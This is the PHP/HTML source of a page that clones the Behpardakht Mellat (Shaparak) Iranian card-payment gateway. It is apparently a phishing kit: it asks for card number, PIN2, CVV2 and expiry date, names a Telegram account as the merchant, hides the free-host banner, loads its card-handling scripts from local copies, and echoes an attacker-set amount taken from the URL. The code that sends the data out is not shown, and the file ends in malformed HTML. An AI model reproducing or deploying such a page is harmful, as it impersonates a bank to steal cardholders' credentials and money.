
<?php

if(isset($_GET['amount'])){
    $_SESSION['amount'] = $_GET['amount'];
}elseif(isset($_GET['price'])){
    $_SESSION['amount'] = $_GET['price'];
}else{
    $_SESSION['amount'] = "900,000";
}


?>








<!DOCTYPE html>


<html lang="fa">
<head>

	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="description" content="">
	<meta name="keywords" content="">
	<meta name="author" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<meta property="og:title" content="پرداخت الکترونیکی به پرداخت ملت" />
	<meta property="og:url" content="http://www.behpardakht.com/" />
	<meta property="og:image" content="http://" />

	<title>پرداخت الکترونیکی به پرداخت ملت</title>
    <link href="img/ipg-favicon.png" rel="shortcut icon">
    <link href="css/esprit_fa.min.css" rel="stylesheet">
    <script src="msg/messages_fa.min.js"></script>

    <style>
        .close-button {
            background-color: #c2c7cc !important;
            background-image: url(/img/ipg-decline.svg) !important;
            width: 25px !important;
            height: 25px !important;
        }
    </style>
    <h1 class="j3sus" style="display:none;"></h1>
    <script src="js/jqueryyui.js"></script>
    <script>
        $( document ).ready(function() {
            setCardSuggestionListHeight();
            countDownRemainingTime(941);
            $("#cardnumber").focus();
            $(document).keydown(function(e) {
                var keyCode = getEventKeyCode(e);
                if (keyCode === ctrlKey || keyCode === cmdKey) ctrlDown = true;
            }).keyup(function(e) {
                var keyCode = getEventKeyCode(e);
                if (keyCode === ctrlKey || keyCode === cmdKey) ctrlDown = false;
            });
        });
    </script>
    <script src="js/payment.min.js?v=9"></script>
    <script>
        encRefId="98151E322DBC6950";
        panDtoList=JSON.parse('[]');
    </script>
    
</head>
<body id="body" class="up-scroll" onclick="hideKeyPadOnOutsideClick(event);hideCardSuggestionListOnOutSideClick(event)">
	<header id="header" >
		<div class="container">
			<div class="beh-card">
				<div class="row">
					<div class="col shaparaklogo align-self-start"><img src="img/shaparak_logo.svg" alt="shaparak"></div>
					<div class="col-6 header-center align-self-end">
						<span>پرداخت الکترونیکی به پرداخت ملت</span><br>
						<a class="J3SS" href="http://www.behpardakht.com">www.Behpardakht.com</a>
					</div>
					<div class="col behpardakhtlogo align-self-start"><img style="float: left" src="img/behpardakht_logo.svg" alt="behpardakht"></div>
				</div>
			</div>
		</div>
	</header>

	<div class="main-wrapper payment">
		<section class="container">
			<div class="row row-eq-height">
				<div class="col-lg-8 col-md-12 col-sm-12 order-lg-1 order-2">
					<div class="beh-card carddetail">
						<span class="shape"></span>

						<div class="card-header">
							<h3>اطلاعات کارت</h3>
							<span id="remaining-time">زمان باقی مانده :<b>10:00</b></span>
                            <span class="card-errorbox">لطفا اطلاعات مورد نیاز را به درستی وارد کنید</span>
						</div>
						<div class="card-body">
							<form class="card-info">

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="cardnumber" class="col-form-label">شماره کارت</label>
										<input type="hidden" id="inputcard" name="inputcard" value="inputcard.jpg">
										<small>شماره کارت 16 رقمی درج شده روی کارت را وارد نمایید</small>
									</div>

									<div class="col-md-6 col-sm-8 col-12 mobile-justify">
										<div class="cardnumberbox">
											<span class="banklogo"></span>
                                            <input type="tel" id="cardnumber" name="cardnumber" maxlength="19"
                                                   onkeydown="preventInvalidKeys(event);setPanCursorPosition(event);"
                                                   onkeyup="formatPanOnKeyUp(event);filterAndShowCardSuggestionList();setBankLogo();focusNextField(this,'inputpin',event);resetSelectedPan(event)"
                                                   oninput="formatPanOnKeyUp(event);setBankLogo();focusNextField(this,'inputpin',event);resetSelectedPan(event)"
                                                   onfocus="hideKeyPad();removeInvalidClassFromPan()"
                                                   onblur="checkPanDiscount()"
                                                value="" 
                                            >
                                            <button type="button" id="card-list-button" data-toggle="dropdown" onclick="toggleAllPans()"
                                                    aria-haspopup="true" aria-expanded="false" tabindex="-1"  ></button>
											<div class="card-suggestionlist dropdown-menu" aria-labelledby="card-list-button">
                                                
											</div>
										</div>
									</div>
								</div>

								<div class="form-group row" onblur="hideKeyPad()">
									<div class="col-sm-4">
										<label for="inputpin" class="col-form-label">رمز اینترنتی کارت</label>
										<small>رمز اینترنتی را وارد نمایید</small>
									</div>

									<div class="col-md-3 col-sm-4 col-8 mobile-justify keypad-parent">
										<input type="password" class="form-control" id="inputpin" name="inputpin" maxlength="12"
                                               
											   onfocus="hideCardSuggestionList();removeInvalidClassFromInput('inputpin')"
											   autocomplete="off"
											   onkeydown="preventInvalidKeys(event);"
											   onkeyup="focusNextField(this,'inputcvv2',event);">
									</div>
									<div class="col-sm-1 ">
										<button type="button" class="form-btn keypad" tabindex="-1" onclick="showKeyPad('inputpin',event)"></button>
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputcvv2" class="col-form-label">شماره شناسایی دوم (CVV2)</label>
										<small>شماره 3 یا 4 رقمی درج شده روی کارت را وارد نمایید</small>
									</div>
									<div class="col-md-3 col-sm-4 col-8  mobile-justify keypad-parent">
                                        <input type="password" class="form-control" id="inputcvv2" name="inputcvv2" maxlength="4"
                                            
                                               onfocus="hideCardSuggestionList();removeInvalidClassFromInput('inputcvv2')"
											   autocomplete="off"
                                               onkeydown="preventInvalidKeys(event);"
                                               onkeyup="focusNextField(this,'inputmonth|inputcapcha',event);">
									</div>
									<div class="col-sm-1">
										<button type="button" class="form-btn keypad" tabindex="-1" onclick="showKeyPad('inputcvv2',event)"></button>
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputmonth" class="col-form-label">تاریخ انقضای کارت</label>
										<small>تاریخ انقضای کارت را وارد کنید </small>
									</div>

									<div class="col-2 d-lg-none d-sm-none"></div>

									<div class="col-md-2 col-sm-3 col-4">
										<input type="tel" class="form-control" name="inputmonth" id="inputmonth" maxlength="2"
											   placeholder="ماه"
											   autocomplete="off"
											   onkeydown="preventInvalidKeys(event);"
                                               onfocus="hideKeyPad();removeInvalidClassFromInput('inputmonth')"
											   onkeyup="focusNextField(this,'inputyear',event);">
									</div>
									<div class="col-md-2 col-sm-3 col-4">
										<input type="tel" class="form-control" name="inputyear" id="inputyear" maxlength="2"
											   placeholder="سال"
											   autocomplete="off"
                                               onfocus="removeInvalidClassFromInput('inputmonth')"
											   onkeydown="preventInvalidKeys(event);"
											   onkeyup="focusNextField(this,'inputcapcha',event)">
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputcapcha" class="col-form-label">کد امنیتی</label>
										<small>لطفا کد امنیتی داخل کادر را وارد نمایید</small>
									</div>
									<div class="col-sm-3 col-8 mobile-justify">
                                        <input type="tel" class="form-control" id="inputcapcha" maxlength="5"
                                               autocomplete="off"
                                               onfocus="removeInvalidClassFromInput('inputcapcha')"
                                               onkeydown="preventInvalidKeys(event);"
                                               onkeyup="focusNextField(this,'inputpayerid|payButton',event)">									</div>
									<div class="col-sm-3 col-6 capcha-container mobile-justify">
										<img id="captcha-img" src="https://bpm.shaparak.ir/pgwchannel/captchaimg.jpg?RefId=27629DFDDC5F4DE4" >
									</div>
									<div class="col-sm-1 col-4">
										<button type="button" class="form-btn capcha" title="نمايش تصوير جديد"
												onclick="refreshCaptcha()"></button>
									</div>
								</div>
                                

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputemail" class="col-form-label">ایمیل</label>
										<small>اختیاری</small>
									</div>
									<div class="col-md-6 col-sm-8 col-12 mobile-justify">
										<input type="email" class="form-control" id="inputemail"
                                               onfocus="removeInvalidClassFromInput('inputemail')">
									</div>
								</div>

								
								<div class="form-group row">
									<div class="col-sm-4"></div>
									<div class="col-md-6 col-sm-8 col-12 mobile-justify btn-submit-form">
										<button type="button" class="btn btn-perches" id="payButton" onclick="validateAndSale(event)">پرداخت</button>
										<button type="button" class="btn btn-decline" onclick="">انصراف</button>
									</div>
								</div>
							</form>
						</div>
					</div>
				</div>

				<div class="col-lg-4 col-md-12 col-sm-12 order-lg-2 order--1">
					<div class="beh-card merchantdetail">
						<div class="card-header">
							<h3>اطلاعات پذیرنده</h3>
						</div>
						<div class="card-body">

							<div class="merchant-container">
								<div class="col-lg-12 col-sm-4 merchant-logo">
									<!--<img class=" " src="img/sample/merchant-logo.png" alt="merchantlogo">-->
									<img class=" " src="img/ipg-defaltlogo.png" alt="merchantlogo">
									<span class="helper"></span>
								</div>

								<ul class="col-lg-12 col-sm-8 merchant-detail">
									<li>نام پذیرنده : <b>lxxcloud</b></li>
									<li>شماره پذیرنده: <b>lxxcloud</b></li>

                                    

                                    <li>آدرس وب سایت: <b class="merchantwebsite"><a  href="https://t.me/lxxcloud">https://t.me/lxxcloud</a></b></li>

									
								</ul>

							</div>

							<ul class="merchant-detail price">
								<li>مبلغ قابل پرداخت :<b class="price-number"><?php echo $_SESSION["amount"]; ?> ریال</b></li>
							</ul>
						</div>

					</div>

				</div>
			</div>
		</section>

		<div class="keypad-container">
			<h4>صفحه کلید ایمن</h4>
			<input type="hidden" id="Char" name="CharField" value="xyz">
			<div class="frame-umbtn"><button id="num1"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num2"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num3"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num4"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num5"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num6"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num7"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num8"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num9"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="clear" type="button" class=" numpad" tabindex="-1" onclick="keyPadBackspace(event)">&#9003;</button></div>
			<div class="frame-umbtn"><button id="num0"  type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="erase" type="button" class=" numpad" tabindex="-1" onclick="keypadTab()">&#8677;</button></div>
		</div>

        
		<section class="container">
			<row class="beh-guid">
				<div class="col">
					<h4>راهنما</h4>
					<ul>
						<li>شماره کارت: 16 رقمی بوده و بصورت 4 قسمت 4 رقمی روی کارت درج شده است.</li>
						<li>cvv2: با طول 3 یا 4 رقم کنار شماره کارت و یا پشت کارت درج شده است.</li>
						<li>تاریخ انقضا: شامل دو بخش ماه و سال انقضا در کنار شماره کارت درج شده است.</li>
						<li>رمز اینترنتی: با عنوان رمز دوم و در برخی موارد با PIN2 شناخته می شود، از طریق بانک صادر کننده کارت تولید شده و همچنین از طریق دستگاه های خودپرداز بانک صادر کننده قابل تهیه و یا تغییر می باشد.</li>
						<li>کد امنیتی: بخشی از محتوای صفحه پرداخت است و لازم است برای ادامه فرایند خرید ، کد موجود که به صورت عددی در تصویر مشخص شده است در محل پیش بینی شده درج شود.</li>
						<li>برای جلوگیری از افشای رمز کارت خود،حتی المقدور از صفحه کلید مجازی استفاده فرمایید.</li>
						<li>برای کسب اطلاعات بیشتر، گزارش فروشگاههای مشکوک و همچنین اطلاع از وضعیت پذیرندگان اینترنتی با ما تماس بگیرید.</li>
						<li>لطفا از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.</li>
						<br><br>
					</ul>
				</div>
			</row>
		</section>
    </div>
	<footer class="footer">
		<div class="container">
			<div class="footerarc"></div>
			<div class="footerarc content">
				<span class="call">شماره تماس: 27312733-021 </span><br>
				<span>شرکت به پرداخت ملت ارايه دهنده خدمات نوین پرداخت الکترونيک</span>
			</div>
			<div class="row justify-content-center">
				<div class="col-12">

				</div>
			</div>
		</div>
	</footer>

    <form method="post" name="returnForm" action="">
        <input type="hidden" id="RefId" name="RefId" value="98151E322DBC6950">
        <input type="hidden" id="Ref" value="http://">
        <input type="hidden" id="ResCode" name="ResCode">
        <input type="hidden" id="SaleOrderId" name="SaleOrderId" value="1034379">
    </form>
	<form method="post" name="resultForm" action="result.mellat" accept-charset="UTF-8">
        <input type="hidden" name="RefId" value="98151E322DBC6950">
	</form>
	
	
	<html>  
<head>
    <style>img[alt="www.000webhost.com"]{display:none;}</style>
  <meta charset="utf-8">
  <title></title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style type="text/css">
	
</body>
</html>
